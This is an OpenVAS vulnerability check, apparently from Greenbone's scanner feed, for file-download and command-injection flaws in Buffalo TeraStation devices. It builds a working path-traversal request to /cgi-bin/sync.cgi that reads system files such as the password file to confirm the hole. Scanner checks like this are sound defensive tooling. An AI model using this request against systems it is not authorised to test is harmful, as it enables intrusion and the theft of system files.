###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_buffalo_teraStation_57634.nasl 11960 2018-10-18 10:48:11Z jschulte $
#
# Buffalo TeraStation Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103650");
  script_bugtraq_id(57634);
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:N");
  script_version("$Revision: 11960 $");

  script_name("Buffalo TeraStation Multiple Security Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/57634");

  script_tag(name:"last_modification", value:"$Date: 2018-10-18 12:48:11 +0200 (Thu, 18 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-01-31 12:41:05 +0100 (Thu, 31 Jan 2013)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"summary", value:"Buffalo TeraStation is prone to an arbitrary file download and an
  arbitrary command-injection vulnerability because it fails to
  sufficiently sanitize user-supplied data.");
  script_tag(name:"impact", value:"An attacker can exploit these issues to download arbitrary files and
  execute arbitrary-commands with root privilege within the context of
  the vulnerable system. Successful exploits will result in the complete
  compromise of affected system.");

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);

files = traversal_files();

foreach pattern(keys(files)) {

  file = files[pattern];

  url = '/cgi-bin/sync.cgi?gSSS=foo&gRRR=foo&gPage=information&gMode=log&gType=save&gKey=/' + file;

  if(http_vuln_check(port:port, url:url,pattern:pattern)) {
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
